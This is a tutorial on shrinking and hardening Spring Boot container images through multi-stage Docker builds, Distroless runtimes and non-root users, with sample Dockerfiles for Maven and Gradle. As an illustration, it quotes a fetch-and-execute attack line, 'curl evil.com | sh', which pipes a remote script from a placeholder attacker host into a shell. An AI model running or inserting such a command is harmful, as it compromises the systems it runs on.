Demystifying Docker: Multi-Stage Builds & Distroless Non-Root Containers

Target: A shocking number of organizations deploy Spring Boot applications packaged inside bloated, 900MB Docker images running as the root user with full GNU package managers (apt/yum), curl, and compilers. If an attacker exploits a remote code execution vulnerability (such as Log4Shell), running as root in an image containing bash and package managers allows them to install rootkits, pivot across your private Kubernetes cluster, and exfiltrate cloud credentials. In this lesson, we master Multi-Stage Docker builds and Google Distroless images: slashing image sizes to ~150MB, removing all shell interpreters, and enforcing non-root user execution.

📖 Primary Source Recommendation

Study the official authority: Google Container Tools: Distroless GitHub Repository & Spring Boot 3.3 Documentation: Efficient Container Layering.. Ground your learning in primary architecture rather than secondary summaries.

💡 Why This Matters in Production

A Distroless container contains ONLY your application and its minimal runtime dependencies—no shell (bash/sh), no package managers, and no OS utilities. An attacker who gains code execution cannot run 'curl evil.com | sh' because neither curl nor sh exists. This simple discipline neutralizes over 90% of automated container exploits.

Key Architectural Takeaways

  • Never ship full JDK build environments in production runtime images; use Multi-Stage Builds to separate the Maven/Gradle build stage from the JRE runtime stage.
  • Never run containers as the 'root' user (UID 0): an attacker who escapes container namespace boundaries inherits root privileges on the host node.
  • Use Google Distroless ('gcr.io/distroless/java21-debian12:nonroot'): it contains no package managers, shells, or standard Linux utilities, radically shrinking attack surface.
  • Layer caching optimization: copy 'pom.xml' or 'build.gradle' and download dependencies in a separate layer BEFORE copying application source code.
  • Extract the fat Spring Boot JAR into layered components (dependencies, spring-boot-loader, snapshot-dependencies, application) using 'java -Djarmode=tools -jar app.jar extract' for optimal Docker caching.
  • Distroless images run as user 'nonroot' (UID 65532).

1. The Security Danger of Fat, Root-Enabled Containers

# The Bad, Dangerous Dockerfile:
FROM openjdk:21
COPY target/app.jar app.jar
CMD ["java", "-jar", "app.jar"]
# Flaws:
# 1. Runs as root (UID 0).
# 2. Ships 800MB full JDK compiler and tooling.
# 3. Contains bash, curl, apt-get, enabling effortless lateral attacker movement.

2. The Multi-Stage Distroless Pattern

Stage 1 (Builder) uses full JDK and Maven to compile the artifact. Stage 2 (Runner) copies only the compiled JAR layers into a distroless runtime: 

# Stage 1: Build & Layer Extraction
FROM eclipse-temurin:21-jdk-jammy AS builder
WORKDIR /workspace
COPY pom.xml mvnw ./
COPY .mvn .mvn
RUN ./mvnw dependency:go-offline
COPY src src
RUN ./mvnw clean package -DskipTests
RUN java -Djarmode=tools -jar target/*.jar extract --layers --launcher

# Stage 2: Minimal Distroless Runtime
FROM gcr.io/distroless/java21-debian12:nonroot
WORKDIR /app
COPY --from=builder /workspace/dependencies/ ./
COPY --from=builder /workspace/spring-boot-loader/ ./
COPY --from=builder /workspace/snapshot-dependencies/ ./
COPY --from=builder /workspace/application/ ./
USER nonroot:nonroot
ENTRYPOINT ["java", "org.springframework.boot.loader.launch.JarLauncher"]

# Production-Grade Dockerfile for Java 21 Spring Boot
# ===================================================
# Stage 1: Extract Spring Boot Layers for Maximum Docker Cache Reuse
FROM eclipse-temurin:21-jdk-jammy AS layer-extractor
WORKDIR /build

# Copy Maven Wrapper and POM first to cache dependency downloads
COPY pom.xml mvnw ./
COPY .mvn .mvn
RUN ./mvnw dependency:go-offline -B

# Copy application source code and compile
COPY src src
RUN ./mvnw clean package -DskipTests -B

# In Spring Boot 3.3+, use 'java -Djarmode=tools -jar target/*.jar extract'
RUN java -Djarmode=tools -jar target/*.jar extract --layers --launcher --destination /build/extracted

# ===================================================
# Stage 2: Distroless Minimal Non-Root Runtime
# Base image size is only ~140MB and contains NO shell or package manager!
FROM gcr.io/distroless/java21-debian12:nonroot
WORKDIR /application

# Copy layers in order of change frequency (least frequent to most frequent)
COPY --from=layer-extractor /build/extracted/dependencies/ ./
COPY --from=layer-extractor /build/extracted/spring-boot-loader/ ./
COPY --from=layer-extractor /build/extracted/snapshot-dependencies/ ./
COPY --from=layer-extractor /build/extracted/application/ ./

# Explicitly ensure execution as non-root user (UID 65532)
USER nonroot:nonroot

# Expose HTTP port
EXPOSE 8080

# Configure JVM ergonomics for container cgroups
ENV JAVA_TOOL_OPTIONS="-XX:MaxRAMPercentage=75.0 -XX:+UseZGC -XX:+ZGenerational"

# Launch using Spring Boot's JarLauncher for instant class loading
ENTRYPOINT ["java", "org.springframework.boot.loader.launch.JarLauncher"]
# Production Dockerfile for Kotlin Spring Boot (Gradle)
# ===================================================
# Stage 1: Build & Layer Extraction
FROM eclipse-temurin:21-jdk-jammy AS builder
WORKDIR /workspace

COPY gradlew gradlew.bat ./
COPY gradle gradle
COPY build.gradle.kts settings.gradle.kts ./
RUN ./gradlew dependencies --no-daemon

COPY src src
RUN ./gradlew bootJar -x test --no-daemon

RUN java -Djarmode=tools -jar build/libs/*.jar extract --layers --launcher --destination /workspace/extracted

# ===================================================
# Stage 2: Distroless Non-Root Runtime
FROM gcr.io/distroless/java21-debian12:nonroot
WORKDIR /application

COPY --from=builder /workspace/extracted/dependencies/ ./
COPY --from=builder /workspace/extracted/spring-boot-loader/ ./
COPY --from=builder /workspace/extracted/snapshot-dependencies/ ./
COPY --from=builder /workspace/extracted/application/ ./

USER nonroot:nonroot
EXPOSE 8080

ENV JAVA_TOOL_OPTIONS="-XX:MaxRAMPercentage=75.0 -XX:+UseZGC -XX:+ZGenerational"

ENTRYPOINT ["java", "org.springframework.boot.loader.launch.JarLauncher"]
